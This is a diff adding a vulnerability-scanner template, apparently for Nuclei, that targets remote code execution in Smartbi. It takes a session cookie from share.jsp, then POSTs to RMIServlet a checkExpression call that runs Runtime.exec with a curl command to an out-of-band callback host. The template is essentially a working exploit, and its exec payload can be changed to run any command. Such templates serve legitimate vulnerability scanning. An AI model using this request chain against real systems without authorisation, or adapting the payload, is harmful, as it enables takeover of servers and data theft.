@@ -1,0 +1,57 @@
+id: smartbi-rce
+
+info:
+  name: smartbi-rce
+  author: iSee857
+  severity: critical
+  description: |
+    smartbi-rce.
+
+variables:
+  dns_url: "{{interactsh-url}}"
+
+http:
+  - id: extract-session
+    method: GET
+    path:
+      - "{{BaseURL}}/smartbi/vision/share.jsp?resid=b904ab9f5a84712a672523a7b4881ee4"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
+      Accept: "*/*"
+      Connection: "keep-alive"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: jsessionid
+        part: header
+        internal: true
+        regex:
+          - "Set-Cookie:\\s*JSESSIONID=([A-Z0-9]+);"
+        group: 1
+
+  - id: validate-rce
+    method: POST
+    path:
+      - "{{BaseURL}}/smartbi/vision/RMIServlet"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
+      Content-Type: "application/x-www-form-urlencoded;charset=UTF-8"
+      Cookie: "JSESSIONID={{jsessionid}}"
+      Connection: "keep-alive"
+
+    body: "className=MetricsModelForVModule&methodName=checkExpression&params=[\"java.lang.Runtime.getRuntime().exec('curl {{dns_url}}')\"]"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
